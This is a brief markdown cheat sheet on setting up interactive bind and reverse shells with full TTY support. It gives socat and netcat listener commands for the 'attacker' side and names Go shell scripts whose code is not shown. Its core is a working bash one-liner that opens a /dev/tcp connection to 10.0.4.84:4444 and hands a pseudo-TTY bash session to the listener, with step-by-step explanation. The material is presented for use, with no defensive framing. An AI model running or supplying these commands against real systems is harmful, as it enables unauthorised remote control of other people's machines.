# TTY Shell Summary

This document summarizes the working commands and Go scripts for setting up interactive bind and reverse shells with proper TTY support.

## 1. Bind Shell via Go + socat

**Attacker (listening):**

```bash
# Use socat to listen on port 4444 with raw mode and no local echo
socat -,raw,echo=0 TCP:10.0.4.84:4444
```

**Victim (Go):**

```bash
# Run Go bind shell script (bind.go) that listens and spawns a TTY bash
go run bind.go
```

## 2. Reverse Shell via Go + netcat

**Attacker (listening):**

```bash
# Listen with netcat on port 4444
nc -nlvp 4444
```

**Victim (Go):**

```bash
# Run Go reverse shell script (rev.go) that connects back with TTY
go run rev.go
```

## 3. Interactive TTY Reverse Shell via Bash + script

When Go is not used on the attacker side, you can receive a fully interactive shell from the victim using built-in Linux utilities:

```bash
bash -c 'exec 5<>/dev/tcp/10.0.4.84/4444; script -qc bash /dev/null <&5 >&5 2>&5'
```

* Opens TCP socket on FD 5 to attacker IP and port 4444.
* Uses `script` in quiet mode (`-q`) to launch `bash` on a pseudo-TTY (`-c bash`) with output discarded (`/dev/null`).
* Redirects stdin, stdout, and stderr over the TCP connection.

**Receiver (Go):**

To receive this TTY shell using Go, run the Go listener:

```bash
go run ttyrecibe.go
```

## 4. Notes

* Ensure your listener (socat or nc) runs before executing the victim commands.
* Replace `10.0.4.84` with your actual attacker IP.
* Port `4444` is used in examples but can be changed as needed.
* This setup provides proper line editing, history, and signal handling (Ctrl-C) on the remote shell.
